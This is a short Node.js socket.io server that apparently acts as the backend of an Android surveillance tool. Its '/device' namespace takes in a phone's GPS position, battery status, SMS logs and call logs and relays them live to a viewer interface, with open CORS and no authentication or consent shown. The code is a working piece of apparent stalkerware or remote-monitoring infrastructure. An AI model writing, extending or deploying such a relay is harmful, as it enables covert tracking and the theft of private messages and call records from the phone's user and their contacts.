const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
  transports: ["websocket", "polling"],
  pingInterval: 25000,
  pingTimeout: 60000
});

// Serve UI
app.use(express.static(path.join(__dirname, 'public')));

// =================== DEVICE NAMESPACE ===================
const deviceNS = io.of("/device");

// Android connects here
deviceNS.on("connection", (socket) => {
  console.log("📱 Device connected:", socket.id);

  socket.emit("server-ack", { ok: true });

  socket.on("gps-update", data => {
    io.of("/ui").emit("ui-gps", data);
  });

  socket.on("battery-status", data => {
    io.of("/ui").emit("ui-battery", data);
  });

  socket.on("sms-data-log", data => {
    io.of("/ui").emit("ui-sms-display", data);
  });

  socket.on("call-log-data", data => {
    io.of("/ui").emit("ui-call-log", data);
  });

  socket.on("disconnect", () => {
    io.of("/ui").emit("device-status", { online: false });
  });
});

// =================== UI NAMESPACE ===================
const uiNS = io.of("/ui");

uiNS.on("connection", (socket) => {
  console.log("🖥️ UI connected:", socket.id);
  socket.emit("device-status", { online: true });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, "0.0.0.0", () =>
  console.log("✅ Server running on", PORT)
);
